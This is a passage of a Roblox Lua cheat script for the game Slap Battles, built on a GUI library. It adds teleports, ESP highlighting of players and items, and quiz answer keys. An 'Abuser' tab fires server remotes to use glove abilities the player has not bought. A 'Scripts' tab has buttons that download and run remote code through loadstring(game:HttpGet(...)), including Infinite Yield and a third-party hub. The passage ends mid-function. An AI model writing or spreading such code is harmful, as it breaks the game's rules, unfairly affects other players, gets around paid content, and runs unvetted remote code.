    Name = "Snowball Smash 2025 Place (2) [PATCHED]",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1088, 327, -20)
    end
})

-- Section Header
Section = Tab:AddSection({
    Name = "Universal Teleports"
})

-- Dropdown Menu
local TeleportsChooser = "Lobby" -- Default fallback
Tab:AddDropdown({
    Name = "Choose Teleportation",
    Default = "Lobby",
    Options = {
        "Lobby", "Arena", "Island 1", "Rainbow Cloud", "Island 2", "Island 3", "Slapple Island",
        "Moai", "Cannon", "Tournament", "Brazil", "Safespot", "Small Safespot",
        "Tournament Safespot", "Killerfish", "Retro", "Limbo", "Cloud", "Debug Room", "Slapple",
        "Candy Corn"
    },
    Callback = function(Value)
        TeleportsChooser = Value
    end
})

-- Teleport Execution Button
Tab:AddButton({
    Name = "Teleport",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character
        
        -- Wait for character if it doesn't exist
        if not character then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Character not found!",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
            return
        end
        
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "HumanoidRootPart not found!",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
            return
        end

        local destinations = {
            ["Lobby"] = CFrame.new(-1100, 328, -2),
            ["Arena"] = CFrame.new(0, 0, 0),
            ["Island 1"] = CFrame.new(3, -5, 219),
            ["Rainbow Cloud"] = CFrame.new(-124, -5, 121),
            ["Island 2"] = CFrame.new(-213, -5, 5),
            ["Island 3"] = CFrame.new(9, -5, -208),
            ["Slapple Island"] = CFrame.new(-392, 51, -18),
            ["Moai"] = CFrame.new(226, -16, -8),
            ["Cannon"] = CFrame.new(247, 34, 184),
            ["Tournament"] = CFrame.new(3421, 244, -8),
            ["Brazil"] = workspace.Lobby.brazil.portal.CFrame,
            ["Safespot"] = CFrame.new(10001, -42, 10000),
            ["Small Safespot"] = CFrame.new(-272, 36, 0),
            ["Tournament Safespot"] = CFrame.new(3457, 249, -27),
            ["Killerfish"] = CFrame.new(2909, 6577, 5519),
            ["Retro"] = CFrame.new(-16874, -3, 4773),
            ["Limbo"] = CFrame.new(18621, 2971, -226),
            ["Cloud"] = function()
                for _, obj in pairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") and obj.Name == "Cloud" then
                        return obj.CFrame
                    end
                end
                return CFrame.new(0, 100, 0) -- Fallback position
            end,
            ["Debug Room"] = CFrame.new(-17922, 60, 3562),
            ["Slapple"] = function()
                if character:FindFirstChild("entered") then
                    for _, v in pairs(workspace.Arena.island5.Slapples:GetChildren()) do
                        if v.Name == "Slapple" or v.Name == "GoldenSlapple" then
                            return v.CFrame
                        end
                    end
                end
                return CFrame.new(-392, 51, -18) -- Fallback to Slapple Island
            end,
            ["Candy Corn"] = function()
                if workspace:FindFirstChild("CandyCorns") then
                    for _, candy in pairs(workspace.CandyCorns:GetChildren()) do
                        if candy:IsA("BasePart") then
                            return candy.CFrame
                        end
                    end
                end
                return CFrame.new(0, 100, 0) -- Fallback position
            end
        }

        local destination = destinations[TeleportsChooser]
        
        if destination then
            -- Handle function destinations (Cloud, Slapple, Candy Corn)
            if type(destination) == "function" then
                destination = destination()
            end
            
            -- Teleport the player
            humanoidRootPart.CFrame = destination
            
            OrionLib:MakeNotification({
                Name = "Teleport Success",
                Content = "Teleported to: " .. TeleportsChooser,
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Invalid teleport selection.",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

local Tab = Window:MakeTab({
    Name = "ESP",
    Icon = "rbxassetid://7743872929",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "ESP Things"
})

-- ========== Helper: Create Billboard ESP ==========
local function createESP(parent, name, text, color)
    local esp = Instance.new("BillboardGui", parent)
    esp.Name = name
    esp.Adornee = parent
    esp.Size = UDim2.new(0, 150, 0, 40)
    esp.StudsOffset = Vector3.new(0, 2, 0)
    esp.AlwaysOnTop = true

    local label = Instance.new("TextLabel", esp)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.TextSize = 16
    label.Font = Enum.Font.FredokaOne
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.2
    label.Text = text

    -- Create highlight
    local highlight = Instance.new("Highlight")
    highlight.Name = name .. "Highlight"
    highlight.Adornee = parent
    highlight.FillColor = color
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = color
    highlight.OutlineTransparency = 0
    highlight.Parent = parent

    return label
end

-- ========== Players ESP ==========
Tab:AddToggle({
    Name = "Players ESP",
    Default = false,
    Callback = function(Value)
        PlayerESP = Value

        if not Value then
            for _, v in ipairs(game.Players:GetPlayers()) do
                local head = v.Character and v.Character:FindFirstChild("Head")
                if head then
                    if head:FindFirstChild("PlayerEsp") then
                        head.PlayerEsp:Destroy()
                    end
                    if head:FindFirstChild("PlayerEspHighlight") then
                        head.PlayerEspHighlight:Destroy()
                    end
                end
            end
            return
        end

        task.spawn(function()
            while PlayerESP do
                local localPlayer = game.Players.LocalPlayer
                for _, v in ipairs(game.Players:GetPlayers()) do
                    if v ~= localPlayer and v.Character and v.Character:FindFirstChild("Head") then
                        local head = v.Character.Head
                        local humanoid = v.Character:FindFirstChild("Humanoid")
                        if head and humanoid then
                            if not head:FindFirstChild("PlayerEsp") then
                                createESP(head, "PlayerEsp", v.Name, Color3.new(1, 1, 1))
                            end
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
})

-- ========== Orb ESP Toggles ==========
local function createOrbESP(name, partName, labelText, color)
    Tab:AddToggle({
        Name = name .. " ESP",
        Default = false,
        Callback = function(Value)
            _G[name .. "ESP"] = Value

            if not Value then
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BillboardGui") and v.Name == name .. "ESP" then
                        v:Destroy()
                    end
                    if v:IsA("Highlight") and v.Name == name .. "ESPHighlight" then
                        v:Destroy()
                    end
                end
                return
            end

            task.spawn(function()
                while _G[name .. "ESP"] do
                    for _, orb in pairs(workspace:GetDescendants()) do
                        if orb:IsA("Part") and orb.Name == partName then
                            if not orb:FindFirstChild(name .. "ESP") then
                                createESP(orb, name .. "ESP", labelText, color)
                            end
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })
end

-- Register all your orb types:
createOrbESP("JetOrb", "JetOrb", "Jet Orb", Color3.fromRGB(255, 255, 0))
createOrbESP("PhaseOrb", "PhaseOrb", "Phase Orb", Color3.fromRGB(170, 0, 255))
createOrbESP("GlitchOrb", "GlitchOrb", "Glitch Orb", Color3.fromRGB(255, 105, 180))
createOrbESP("SiphonOrb", "SiphonOrb", "Siphon Orb", Color3.fromRGB(0, 255, 255))
createOrbESP("MaterializeOrb", "MATERIALIZEOrb", "Materialize Orb", Color3.fromRGB(0, 170, 255))
createOrbESP("Toolbox", "Toolbox", "Toolbox", Color3.fromRGB(139, 69, 19))

-- ========== Unique ESPs ==========
Tab:AddToggle({
    Name = "Duck ESP",
    Default = false,
    Callback = function(Value)
        DuckESP = Value
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "DuckESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "DuckESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while DuckESP do
                local duck = workspace:FindFirstChild("Arena") and workspace.Arena["default island"]:FindFirstChild("Rubber Ducky")
                if duck and duck:IsA("Part") then
                    if not duck:FindFirstChild("DuckESP") then
                        createESP(duck, "DuckESP", "Duck", Color3.fromRGB(255, 255, 102))
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

-- Orange ESP
Tab:AddToggle({
    Name = "Orange ESP",
    Default = false,
    Callback = function(Value)
        OrangeESP = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "OrangeESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "OrangeESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while OrangeESP do
                local success, result = pcall(function()
                    return workspace.Arena.island5:FindFirstChild("Orange")
                end)

                if success and result and result:IsA("MeshPart") then
                    if not result:FindFirstChild("OrangeESP") then
                        createESP(result, "OrangeESP", "Orange", Color3.fromRGB(255, 165, 0))
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

-- Court Evidence / Knife ESP
Tab:AddToggle({
    Name = "Court Evidence ESP",
    Default = false,
    Callback = function(Value)
        KnifeESP = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "KnifeESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "KnifeESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while KnifeESP do
                local success, result = pcall(function()
                    return workspace.Lobby.Scene:FindFirstChild("knofe")
                end)

                if success and result and result:IsA("Part") then
                    if not result:FindFirstChild("KnifeESP") then
                        createESP(result, "KnifeESP", "Knife", Color3.fromRGB(169, 169, 169))
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

-- Run Exit Door ESP
Tab:AddToggle({
    Name = "Run Exit Door ESP",
    Default = false,
    Callback = function(Value)
        _G.LabyrinthESP = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "LabyrinthExitESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "LabyrinthExitESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while _G.LabyrinthESP do
                for _, labyrinth in pairs(workspace:GetChildren()) do
                    if string.find(labyrinth.Name, "Labyrinth") and labyrinth:FindFirstChild("Doors") then
                        for _, door in ipairs(labyrinth.Doors:GetChildren()) do
                            local hitbox = door:FindFirstChild("Hitbox")
                            local touch = hitbox and hitbox:FindFirstChild("TouchInterest")

                            if hitbox and touch and not hitbox:FindFirstChild("LabyrinthExitESP") then
                                createESP(hitbox, "LabyrinthExitESP", "Exit", Color3.fromRGB(255, 0, 0))
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

-- Slasher Door ESP
Tab:AddToggle({
    Name = "Slasher Door ESP",
    Default = false,
    Callback = function(Value)
        SlasherESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "SlasherDoorESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "SlasherDoorESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while SlasherESPEnabled do
                for _, labyrinth in pairs(workspace:GetChildren()) do
                    if labyrinth:IsA("Model") and labyrinth.Name:find("'s Labyrinth") then
                        local paintingModel = labyrinth:FindFirstChild("PaintingModel")
                        if paintingModel then
                            local hitbox = paintingModel:FindFirstChild("HitBox")
                            if hitbox and hitbox:IsA("BasePart") and not hitbox:FindFirstChild("SlasherDoorESP") then
                                createESP(hitbox, "SlasherDoorESP", "Slasher Door", Color3.fromRGB(255, 100, 100))
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

-- Keypad ESP
Tab:AddToggle({
    Name = "Keypad ESP",
    Default = false,
    Callback = function(Value)
        KeypadESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "KeypadESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "KeypadESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while KeypadESPEnabled do
                local targetPart = workspace:FindFirstChild("Keypad")
                targetPart = targetPart and targetPart:FindFirstChild("Backpiece")

                if targetPart and targetPart:IsA("BasePart") and not targetPart:FindFirstChild("KeypadESP") then
                    createESP(targetPart, "KeypadESP", "Keypad", Color3.fromRGB(0, 0, 0))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Grave ESP",
    Default = false,
    Callback = function(Value)
        GraveESP = Value

        if not Value then
            local grave = workspace:FindFirstChild("Gravestone")
            if grave and grave:IsA("Model") then
                local gui = grave:FindFirstChild("GraveESP")
                if gui then gui:Destroy() end
                local highlight = grave:FindFirstChild("GraveESPHighlight")
                if highlight then highlight:Destroy() end
            end
            return
        end

        task.spawn(function()
            while GraveESP do
                local graveTarget = workspace:FindFirstChild("Gravestone")
                if graveTarget and graveTarget:IsA("Model") and not graveTarget:FindFirstChild("GraveESP") then
                    createESP(graveTarget, "GraveESP", "Grave", Color3.fromRGB(255, 0, 0))
                end
                task.wait(0.5)
            end
        end)
    end
})

Section = Tab:AddSection({
    Name = "ESP Other Things"
})

Tab:AddToggle({
    Name = "Error Stand Glove ESP",
    Default = false,
    Callback = function(Value)
        ErrorStandESP = Value

        if not Value then
            local existing = workspace:FindFirstChild("Lobby")
            local target = existing and existing:FindFirstChild("Error")
            if target and target:IsA("MeshPart") then
                local gui = target:FindFirstChild("ErrorStandESP")
                if gui then gui:Destroy() end
                local highlight = target:FindFirstChild("ErrorStandESPHighlight")
                if highlight then highlight:Destroy() end
            end
            return
        end

        task.spawn(function()
            while ErrorStandESP do
                local target = workspace:FindFirstChild("Lobby")
                target = target and target:FindFirstChild("Error")

                if target and target:IsA("MeshPart") and not target:FindFirstChild("ErrorStandESP") then
                    createESP(target, "ErrorStandESP", "Error Stand Glove", Color3.fromRGB(255, 105, 180))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Hitman NPC ESP",
    Default = false,
    Callback = function(Value)
        BountyHunterESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "BountyHunterESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "BountyHunterESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while BountyHunterESPEnabled do
                local npcModel = workspace:FindFirstChild("BountyHunterRoom") 
                    and workspace.BountyHunterRoom:FindFirstChild("BountyHunterBooth") 
                    and workspace.BountyHunterRoom.BountyHunterBooth:FindFirstChild("NPC")

                if npcModel and npcModel:IsA("Model") then
                    local npcPart = npcModel:FindFirstChild("HumanoidRootPart") or npcModel:FindFirstChildWhichIsA("BasePart")
                    if npcPart and not npcPart:FindFirstChild("BountyHunterESP") then
                        createESP(npcPart, "BountyHunterESP", "Hitman NPC", Color3.fromRGB(139, 69, 19))
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Drawing Post ESP",
    Default = false,
    Callback = function(Value)
        DrawingPostESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "DrawingPostESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "DrawingPostESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while DrawingPostESPEnabled do
                local postPart = workspace:FindFirstChild("Lobby")
                    and workspace.Lobby:FindFirstChild("Clothesline Model")
                    and workspace.Lobby["Clothesline Model"]:FindFirstChild("Part")

                if postPart and postPart:IsA("BasePart") and not postPart:FindFirstChild("DrawingPostESP") then
                    createESP(postPart, "DrawingPostESP", "Drawing Post", Color3.fromRGB(255, 255, 255))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Barzil Portal ESP",
    Default = false,
    Callback = function(Value)
        BarzilPortalESP = Value

        if not Value then
            local lobby = workspace:FindFirstChild("Lobby")
            local brazil = lobby and lobby:FindFirstChild("brazil")
            local portal = brazil and brazil:FindFirstChild("portal")

            if portal and portal:IsA("Part") then
                local gui = portal:FindFirstChild("BarzilPortalESP")
                if gui then gui:Destroy() end
                local highlight = portal:FindFirstChild("BarzilPortalESPHighlight")
                if highlight then highlight:Destroy() end
            end
            return
        end

        task.spawn(function()
            while BarzilPortalESP do
                local lobby = workspace:FindFirstChild("Lobby")
                local brazil = lobby and lobby:FindFirstChild("brazil")
                local portal = brazil and brazil:FindFirstChild("portal")

                if portal and portal:IsA("Part") and not portal:FindFirstChild("BarzilPortalESP") then
                    createESP(portal, "BarzilPortalESP", "Barzil Portal", Color3.fromRGB(170, 0, 255))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "asset/?id=12357588065 ESP (has no name lol)",
    Default = false,
    Callback = function(Value)
        OverkillESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "OverkillESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "OverkillESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while OverkillESPEnabled do
                local decal = workspace:FindFirstChild("Lobby")
                    and workspace.Lobby:FindFirstChild("GloveStands")
                    and workspace.Lobby.GloveStands:FindFirstChild("OVERKILL")
                    and workspace.Lobby.GloveStands.OVERKILL:FindFirstChild("Decal")

                if decal and decal:IsA("Decal") and decal.Texture:find("12357588065") then
                    local adornee = decal.Parent
                    if adornee and adornee:IsA("BasePart") and not adornee:FindFirstChild("OverkillESP") then
                        createESP(adornee, "OverkillESP", "Decal", Color3.fromRGB(255, 0, 0))
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Chair ESP",
    Default = false,
    Callback = function(Value)
        ChairESP = Value

        if not Value then
            local lobby = workspace:FindFirstChild("Lobby")
            local chair = lobby and lobby:FindFirstChild("Chair")
            local union = chair and chair:FindFirstChild("Union")

            if union and union:IsA("BasePart") then
                local gui = union:FindFirstChild("ChairESP")
                if gui then gui:Destroy() end
                local highlight = union:FindFirstChild("ChairESPHighlight")
                if highlight then highlight:Destroy() end
            end
            return
        end

        task.spawn(function()
            while ChairESP do
                local lobby = workspace:FindFirstChild("Lobby")
                local chair = lobby and lobby:FindFirstChild("Chair")
                local union = chair and chair:FindFirstChild("Union")

                if union and union:IsA("BasePart") and not union:FindFirstChild("ChairESP") then
                    createESP(union, "ChairESP", "Chair", Color3.fromRGB(139, 69, 19))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Plate ESP",
    Default = false,
    Callback = function(Value)
        PlateESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "PlateESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "PlateESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while PlateESPEnabled do
                local plate = workspace:FindFirstChild("Arena") and workspace.Arena:FindFirstChild("Plate")
                if plate and plate:IsA("BasePart") and not plate:FindFirstChild("PlateESP") then
                    createESP(plate, "PlateESP", "Plate", Color3.fromRGB(255, 255, 255))
                end
                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Cheese ESP",
    Default = false,
    Callback = function(Value)
        CheeseESPEnabled = Value

        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "CheeseESP" then
                    v:Destroy()
                end
                if v:IsA("Highlight") and v.Name == "CheeseESPHighlight" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while CheeseESPEnabled do
                local cheese = workspace:FindFirstChild("Cheese")
                if cheese and cheese:IsA("BasePart") and not cheese:FindFirstChild("CheeseESP") then
                    createESP(cheese, "CheeseESP", "Cheese", Color3.fromRGB(255, 255, 0))
                end
                task.wait(0.5)
            end
        end)
    end
})

local Tab = Window:MakeTab({
    Name = "Recall",
    Icon = "rbxassetid://8997387937",
    PremiumOnly = false
})

--// Section: Answers
Tab:AddSection({
    Name = "Answers"
})

Tab:AddParagraph("When was Slap Battles first published?", "16/2/2021")
Tab:AddParagraph("What glove costs 9750 slaps?", "Coil")
Tab:AddParagraph("What is the chance of getting bob from Replica?", "1/7500")
Tab:AddParagraph("How many gloves stands are in Slap Battles right now?", "268 (Last Updated: 6 February 2026 UTC, Pinwheel & Acrobat Mastery Update)")
Tab:AddParagraph("What is the badge name for the Glitch glove?", "01010010 01010101 01001110")
Tab:AddParagraph("If 1=3 2=3 3=5 4=4 5=4 6=?", "3")
Tab:AddParagraph("Whom ultimately controls this realm?", "Tencelll")
Tab:AddParagraph("How many slaps do you have?", "Check Below")
Tab:AddParagraph("How many players were present in this server when you were sent here?", "Check Below")
Tab:AddParagraph("What color is your name in the Roblox Chat?", "First Check Ur Color Name In Chat Before Answer")
Tab:AddParagraph("How old is your account in days?", "Check Below")
Tab:AddParagraph("What has a bottom at the top?", "A leg (You must type in the chat)")
Tab:AddParagraph("When was Slap Battles first published?", "A leg (You must type in the chat)")
Tab:AddParagraph("Did you forget that you repressed your memories?", "Yes")
Tab:AddParagraph("Do you know who I am?", "A forgotten memory")
Tab:AddParagraph("How many players currently exist in this realm as of when I started asking this question?", "Count the number of people in the server when the clone asks this question, enter that number.")
Tab:AddParagraph("What has 4 fingers and one thumb but is not alive?", "Glove (You must type in the chat)")
Tab:AddParagraph("What glove can't you hit when it isn't there?", "Elude")
Tab:AddParagraph("We will play Simon Says at the end, do you understand?", "Yes")

--// Section: Simon Says
Tab:AddSection({
    Name = "Simon Says"
})

Tab:AddParagraph("Simon says if you seek for the reward, dance on top of the entities head.",
    "Dance on top of the clone's head (by typing /e dance) if it says Simon says. Walk through the portal if it doesn't say Simon says")

Tab:AddParagraph("Simon says walk through the portal to claim your reward",
    "Self-explanatory. Walk through the portal if it says Simon says. Jump off the map if it doesn't say Simon says")

Tab:AddParagraph("Simon says jump off the map to claim your reward",
    "Self-explanatory. Jump off the map if it says Simon says. Walk through the portal if it doesn't say Simon says")

Tab:AddParagraph("Simon says if the reward is what you seek, You must dance on top of the Right/Left staircase Crystal.",
    "Dance on top of the Crystals according to the NPC's Perspective by using the command (/e dance) in chat. If it says, (Left Crystal), You go and Dance on the Right Crystal (Its Left will be your Right and its Right will be your Left). Walk through the portal if it doesn't say Simon says")

Tab:AddParagraph("Simon says riddle me this and speak it out. What has four fingers and a thumb but isn't alive?",
    "Type (a glove) in chat.")

Tab:AddParagraph("Simon says riddle me this and speak it out. What has a bottom at the top?",
    "Type (a leg) in chat.")

--// Section: Info
Tab:AddSection({
    Name = "Info"
})

-- Dynamic Labels
local ServerPlayer = Tab:AddLabel("Player In Server [ " .. #game.Players:GetPlayers() .. " / " .. game.Players.MaxPlayers .. " ]")
local AgeAccYou = Tab:AddLabel("Your Account Age [ " .. game.Players.LocalPlayer.AccountAge .. " ]")
local CheckSlap = Tab:AddLabel("Check Slap [ " .. game.Players.LocalPlayer.leaderstats.Slaps.Value .. " ]")

-- Auto Set Info Toggle
local AutoSetInfoServer

Tab:AddToggle({
    Name = "Auto Set Info",
    Default = false,
    Callback = function(Value)
        _G.AutoSetInfo = Value

        if Value then
            AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
                ServerPlayer:Set("Player In Server [ " .. #game.Players:GetPlayers() .. " / " .. game.Players.MaxPlayers .. " ]")
                AgeAccYou:Set("Your Account Age [ " .. game.Players.LocalPlayer.AccountAge .. " ]")
                CheckSlap:Set("Check Slap [ " .. game.Players.LocalPlayer.leaderstats.Slaps.Value .. " ]")
            end)
        elseif AutoSetInfoServer then
            AutoSetInfoServer:Disconnect()
            AutoSetInfoServer = nil
        end
    end
})

local Tab = Window:MakeTab({
    Name = "Scripts",
    Icon = "rbxassetid://8997388036",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Incognito Scripts (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Web Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://incognitoscriptslua.vercel.app')
    end
})

Section = Tab:AddSection({
    Name = "Bacon Scripter (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Discord Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://discord.gg/29zcq8NWBC')
    end
})

Section = Tab:AddSection({
    Name = "DonjoSx (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Discord Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://discord.gg/xpvq9heeRm')
    end
})

Section = Tab:AddSection({
    Name = "SPRG Squad (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Discord Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://discord.gg/emvU4HuQFk')
    end
})

Section = Tab:AddSection({
    Name = "Herkle Hub (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Discord Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://discord.gg/herkle')
    end
})

Section = Tab:AddSection({
    Name = "Kizzy (Link To All Scripts)"
})

Tab:AddButton({
    Name = "Copy Discord Link Where Has All Scripts",
    Callback = function()
        setclipboard('https://discord.com/JkQFehEKRK')
    end
})

-- Universal Section
Section = Tab:AddSection({
    Name = "Universal"
})

Tab:AddButton({
    Name = "Giang Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
    end
})

Tab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
})

local Tab = Window:MakeTab({
    Name = "Abuser",
    Icon = "rbxassetid://7734058599",
    PremiumOnly = false
})

Section = Tab:AddSection({
	Name = "Diamond (45 Slaps)"
})

Tab:AddButton({
	Name = "Diamond",
	Callback = function() 
fireclickdetector(workspace.Lobby["Diamond"].ClickDetector)  
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Rockmode"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "ZZZZZZZ (70 Slaps)"
})

Tab:AddButton({
	Name = "ZZZZZZZ",
	Callback = function()   
fireclickdetector(workspace.Lobby["ZZZZZZZ"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("ZZZZZZZSleep"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Brick (150 Slaps)"
})

Tab:AddButton({
	Name = "Brick",
	Callback = function()   
fireclickdetector(workspace.Lobby["Brick"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("lbrick"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Flash (315 Slaps)"
})

Tab:AddButton({
	Name = "Flash",
	Callback = function()   
fireclickdetector(workspace.Lobby["Flash"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("FlashTeleport"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pinwheel (300 Slaps)"
})

Tab:AddButton({
	Name = "Pinwheel",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pinwheel"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events:GetChildren()[123]:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Swapper (420 Slaps)"
})

Tab:AddButton({
	Name = "Swapper",
	Callback = function()   
fireclickdetector(workspace.Lobby["Swapper"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Ghost (666 Slaps)"
})

Tab:AddButton({
	Name = "Ghost (On)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Ghost"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Ghostinvisibilityactivated"):FireServer()
end
})

Tab:AddButton({
	Name = "Ghost (Off)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Ghost"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Ghostinvisibilitydeactivated"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Thanos (795 Slaps)"
})

Tab:AddButton({
	Name = "Thanos",
	Callback = function()  
fireclickdetector(workspace.Lobby["Thanos"].ClickDetector)
wait(0.1)
local args = {
    [1] = 1
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Thanos (2)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Thanos"].ClickDetector)
wait(0.1)
local args = {
    [1] = 2
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Za Hando (1000 Slaps)"
})

Tab:AddButton({
	Name = "Za Hando",
	Callback = function()   
fireclickdetector(workspace.Lobby["Za Hando"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Erase:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Fort (1075 Slaps)"
})

Tab:AddButton({
	Name = "Fort",
	Callback = function()   
fireclickdetector(workspace.Lobby["Fort"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Fortlol"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Pusher (1250 Slaps)"
})

Tab:AddButton({
	Name = "Pusher",
	Callback = function()   
fireclickdetector(workspace.Lobby["Pusher"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("PusherWall"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Mail (2000 Slaps)"
})

Tab:AddButton({
	Name = "Mail",
	Callback = function()  
fireclickdetector(workspace.Lobby["Mail"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("MailSend"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Golden (2500 Slaps)"
})

Tab:AddButton({
	Name = "Golden",
	Callback = function()   
